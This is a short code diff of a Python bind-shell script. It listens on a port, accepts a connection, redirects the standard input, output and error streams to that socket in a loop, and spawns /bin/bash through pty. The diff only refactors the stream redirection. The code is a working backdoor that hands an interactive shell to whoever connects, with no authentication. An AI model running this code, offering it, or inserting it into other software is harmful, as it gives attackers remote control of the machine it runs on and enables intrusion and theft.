@@ -19,9 +19,10 @@ def main(port):
     s.bind(("", port))
     s.listen(1)
     (conn, address) = s.accept()
-    os.dup2(conn.fileno(), 0);
-    os.dup2(conn.fileno(), 1);
-    os.dup2(conn.fileno(), 2);
+
+    for x in range(3):
+        os.dup2(conn.fileno(), x);
+
     pty.spawn("/bin/bash")
     s.close()
 
